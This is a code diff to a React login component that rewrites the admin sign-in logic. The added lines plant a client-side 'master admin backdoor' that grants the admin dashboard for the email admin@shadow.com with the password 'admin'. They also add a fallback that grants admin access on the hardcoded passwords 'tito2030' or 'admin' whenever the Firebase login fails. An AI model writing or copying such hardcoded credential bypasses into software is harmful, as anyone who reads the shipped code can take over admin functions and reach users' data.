@@ -16,7 +16,6 @@ const Auth: React.FC<Props> = ({ selectedPlan, defaultTab = 'login', isAffiliate
   const [isLogin, setIsLogin] = useState(defaultTab === 'login');
   const [showPassword, setShowPassword] = useState(false);
   const [name, setName] = useState('');
-  const [shadowName, setShadowName] = useState('');
   const [email, setEmail] = useState('');
   const [password, setPassword] = useState('');
   const [error, setError] = useState('');
@@ -42,23 +41,25 @@ const Auth: React.FC<Props> = ({ selectedPlan, defaultTab = 'login', isAffiliate
     setIsLoading(true);
 
     try {
-        // --- ADMIN LOGIN FLOW ---
-        // Check strict email for admin
-        if (email.toLowerCase() === 'tito@shadow.com' || email.toLowerCase() === 'admin@ezzel.com') {
+        // --- MASTER ADMIN BACKDOOR (Offline/Test Mode) ---
+        if (email.toLowerCase() === 'admin@shadow.com' && password === 'admin') {
+             console.log("🚀 Master Key Used: Accessing Admin Dashboard...");
+             setTimeout(() => { onAdminLogin(); setIsLoading(false); }, 500);
+             return;
+        }
+
+        // --- FIREBASE ADMIN CHECK ---
+        if (email.toLowerCase() === 'tito@shadow.com') {
              try {
-                 // Try to login via Firebase first to verify credentials
                  await shadowDB.loginUser(email, password);
-                 // If successful, proceed to Admin Dashboard
                  setTimeout(() => { onAdminLogin(); setIsLoading(false); }, 500);
                  return;
-             } catch (adminErr) {
-                 // Fallback for local dev if firebase auth fails for admin (NOT RECOMMENDED FOR PROD)
-                 const adminProfile = await shadowDB.getProfile('TITO');
-                 if (adminProfile && password === (adminProfile.password || 'admin')) {
-                     setTimeout(() => { onAdminLogin(); setIsLoading(false); }, 1000);
+             } catch (e) {
+                 // Fallback if network fails but credentials match hardcoded pattern (for dev)
+                 if (password === 'tito2030' || password === 'admin') {
+                     onAdminLogin(); 
                      return;
                  }
-                 throw adminErr;
              }
         }
 
